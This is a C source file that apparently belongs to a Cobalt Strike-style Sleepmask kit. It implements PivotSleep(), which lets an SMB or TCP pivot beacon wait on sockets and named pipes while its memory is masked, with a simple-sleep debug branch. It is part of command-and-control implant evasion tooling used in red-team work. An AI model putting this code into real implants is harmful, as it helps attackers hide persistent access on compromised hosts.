#include <windows.h>

#include "../beacon.h"
#include "../base/helpers.h"
#include "../sleepmask.h"
#include "../sleepmask-vs.h"
#include "../debug.h"

/**
* SMB/TCP Beacon sleep
*
* @param sleepmaskInfo A pointer to the SLEEPMASK_INFO structure
*/
void PivotSleep(PSLEEPMASK_INFO info) {
#ifndef _DEBUG
    DFR_LOCAL(WS2_32, accept);
    DFR_LOCAL(WS2_32, recv);
    DFR_LOCAL(KERNEL32, ConnectNamedPipe);
    DFR_LOCAL(KERNEL32, SetNamedPipeHandleState);
    DFR_LOCAL(KERNEL32, PeekNamedPipe);
    DFR_LOCAL(KERNEL32, GetLastError);
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    DFR_LOCAL(KERNEL32, Sleep);

    // Create new variables for readability
    PIVOT_ACTION action = info->pivot_args.action;
    PIVOT_ARGS pivotArguments = info->pivot_args;

    if (action == ACTION_TCP_ACCEPT) {
        // Accept a socket
        pivotArguments.out = accept(pivotArguments.in, NULL, NULL);
    }
    else if (action == ACTION_TCP_RECV) {
        // Block until data is available 
        recv(pivotArguments.in, (char*)&(pivotArguments.out), 1, MSG_PEEK);
    }
    else if (action == ACTION_PIPE_WAIT) {
        BOOL fConnected = 0;

        // Change the pipe to NOWAIT state
        DWORD mode = PIPE_READMODE_BYTE | PIPE_NOWAIT;
        if (!SetNamedPipeHandleState(pivotArguments.pipe, &mode, NULL, NULL)) {
            return;
        }
        // Wait for a connection to the pipe
        DLOGF("SLEEPMASK: Waiting for a connection...");
        while (!fConnected) {
            // Small sleep before trying to connect
            Sleep(1000);
            fConnected = ConnectNamedPipe(pivotArguments.pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);   
        }

        // Change the pipe back to blocking mode
        mode = PIPE_READMODE_BYTE;
        if (!SetNamedPipeHandleState(pivotArguments.pipe, &mode, NULL, NULL)) {
           return;
        }
    }
    else if (action == ACTION_PIPE_PEEK) {
            DWORD dataAvailable = 0;

            // Wait for data to be available on our pipe.
            while (TRUE) {
                if (!PeekNamedPipe(pivotArguments.pipe, NULL, 0, NULL, &dataAvailable, NULL)) {
                    break;
                }

                if (dataAvailable > 0) {
                    break;
                }

                // Add a small Sleep between checking the pipe for data
                Sleep(500);
            }
        }
#else
    /**
    * The pivot sleep adds a lot of complexity due to the sockets/pipe connections.
    * To simplify the debugging experience, PivotSleep() will just sleep and return. 
    * In future, we will provide some additional debugging tools to help with this 
    * aspect of the Sleepmask as well.
    */
    DFR_LOCAL(KERNEL32, Sleep);
    Sleep(3000);
#endif
    return; 
}
